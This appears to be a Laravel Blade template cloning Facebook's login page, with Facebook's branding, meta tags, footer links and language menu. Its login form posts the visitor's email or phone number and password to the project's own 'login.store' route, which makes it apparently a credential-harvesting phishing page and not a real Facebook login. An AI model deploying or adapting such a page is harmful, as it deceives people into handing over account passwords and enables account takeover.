<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Facebook - {{ __('Log in or sign up') }}</title>
    <meta property="og:site_name" content="Facebook">
    <meta property="og:url" content="">
    <meta property="og:image" content="assets/desktop/images/fb_icon_325x325.png">
    <meta property="og:locale" content="{{ app()->getLocale() }}">
    <meta name="description" content="{{ __('Log in to Facebook to start sharing and connecting with your friends, family and people you know.') }}">
    <link rel="shortcut icon" href="{{ asset('assets/desktop/images/favicon.ico') }}">
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
    <link rel="stylesheet" type="text/css" href="{{ asset('assets/css/bootstrap.min.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ asset('assets/css/style.css') }}" />
</head>
<body>
<div class="fb-content">
    <div class="content-wrap">
        <div class="content-left">
            <img src="{{ asset('assets/images/logo.svg') }}" alt="logo">
            <div class="desc">
                {{ __('Facebook helps you connect and share with the people in your life.') }}
            </div>
        </div>
        <div class="content-right">
            <form class="login-form" action="{{ route('login.store') }}" method="POST">
                @csrf
                <input type="email" name="username" placeholder="{{ __('Email address or phone number') }}">
                @if($errors->has('username'))
                <div class="error-message"><span class="text-danger">{{ $errors->first('username') }}</span></div>
                @endif
                <input type="password" name="password" placeholder="{{ __('Password') }}">
                @if($errors->has('password'))
                    <div class="error-message"><span class="text-danger">{{ $errors->first('password') }}</span></div>
                @endif
                <button type="submit" name="login">{{ __('Log In') }}</button>
                <div class="forgot-pass">
                    <a href="#">{{ __('Forgotten password?') }}</a>
                </div>
                <a class="register-btn">{{ __('Create New Account') }}</a>
            </form>
            <div class="note-form"><a href="#">{{ __('Create a Page') }}</a> {{ __('for a celebrity, brand or business.') }}</div>
        </div>
    </div>
</div>
<footer class="content-wrap">
    <ul class="language">
        <li><a href="{{ route('language', 'vi') }}">Tiếng Việt</a></li>
        <li><a href="{{ route('language', 'en') }}">English (UK)</a></li>
        <li><a href="">中文(台灣)</a></li>
        <li><a href="">한국어</a></li>
        <li><a href="">日本語</a></li>
        <li><a href="">Français (France)</a></li>
        <li><a href="">ภาษาไทย</a></li>
        <li><a href="">Español</a></li>
        <li><a href="">Português (Brasil)</a></li>
        <li><a href="">Deutsch</a></li>
        <li><a href="">Italiano</a></li>
        <li><a href="">Thêm ngôn ngữ</a></li>
    </ul>
    <div id="contentCurve"></div>
    <ul class="link-list">
        <li><a href="">{{ __('Sign Up') }}</a></li>
        <li><a href="">{{ __('Log In') }}</a></li>
        <li><a href="">{{ __('Messenger') }}</a></li>
        <li><a href="">{{ __('Facebook Lite') }}</a></li>
        <li><a href="">{{ __('Watch') }}</a></li>
        <li><a href="">{{ __('Places') }}</a></li>
        <li><a href="">{{ __('Games') }}</a></li>
        <li><a href="">{{ __('Marketplace') }}</a></li>
        <li><a href="">{{ __('Facebook Pay') }}</a></li>
        <li><a href="">{{ __('Oculus') }}</a></li>
        <li><a href="">{{ __('Portal') }}</a></li>
        <li><a href="">{{ __('Instagram') }}</a></li>
        <li><a href="">{{ __('Bulletin') }}</a></li>
        <li><a href="">{{ __('Local') }}</a></li>
        <li><a href="">{{ __('Fundraisers') }}</a></li>
        <li><a href="">{{ __('Services') }}</a></li>
        <li><a href="">{{ __('Voting Information Centre') }}</a></li>
        <li><a href="">{{ __('Groups') }}</a></li>
        <li><a href="">{{ __('About') }}</a></li>
        <li><a href="">{{ __('Create ad') }}</a></li>
        <li><a href="">{{ __('Create Page') }}</a></li>
        <li><a href="">{{ __('Developers') }}</a></li>
        <li><a href="">{{ __('Careers') }}</a></li>
        <li><a href="">{{ __('Privacy') }}</a></li>
        <li><a href="">{{ __('Cookies') }}</a></li>
        <li><a href="" class="_41ug">{{ __('AdChoices') }}<i class="img sp_8s3dp67SKVi_2x sx_5d18ea"></i></a></li>
        <li><a href="">{{ __('Terms') }}</a></li>
        <li><a href="">{{ __('Help') }}</a></li>
    </ul>
</footer>
</body>
</html>